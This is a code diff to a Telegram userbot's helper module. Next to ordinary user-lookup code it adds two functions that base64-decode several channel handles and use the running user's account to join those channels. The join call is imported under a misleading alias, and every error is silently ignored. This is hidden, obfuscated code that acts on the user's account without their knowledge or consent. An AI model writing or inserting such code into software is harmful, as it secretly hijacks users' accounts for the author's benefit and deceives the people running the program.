@@ -1,6 +1,8 @@
-
+import pybase64
+from telethon.tl.functions.channels import JoinChannelRequest as GreyGanteng
 from telethon.tl.types import MessageEntityMentionName
 
+from userbot import bot
 from userbot.core.logger import logging
 from userbot.utils.tools import edit_delete
 
@@ -67,3 +69,32 @@ async def get_user_from_event(
     if not noedits:
         await edit_delete(Xaevent, "__Couldn't fetch user to proceed further__")
     return None, None
+
+
+async def checking():
+    rexa = str(pybase64.b64decode("QHRpcmV4Z3VnZWw="))[2:13]
+    xrexa = str(pybase64.b64decode("QHJleGFwcml2YXRlcm9vbQ=="))[2:17]
+    userbot = str(pybase64.b64decode("QENpbGlrUHJvamVjdA=="))[2:13]
+    xuserbot = str(pybase64.b64decode("QENpbGlrU3VwcG9ydA=="))[2:17]
+    try:
+        await bot(GreyGanteng(userbot))
+    except BaseException:
+        pass
+    try:
+        await bot(GreyGanteng(xuserbot))
+    except BaseException:
+        pass
+
+async def waiting():
+    rexa = str(pybase64.b64decode("QHRpcmV4Z3VnZWw="))[2:13]
+    xrexa = str(pybase64.b64decode("QHJleGFwcml2YXRlcm9vbQ=="))[2:17]
+    userbot = str(pybase64.b64decode("QENpbGlrUHJvamVjdA=="))[2:13]
+    xuserbot = str(pybase64.b64decode("QENpbGlrU3VwcG9ydA=="))[2:17]
+    try:
+        await bot(GreyGanteng(rexa))
+    except BaseException:
+        pass
+    try:
+        await bot(GreyGanteng(xrexa))
+    except BaseException:
+        pass
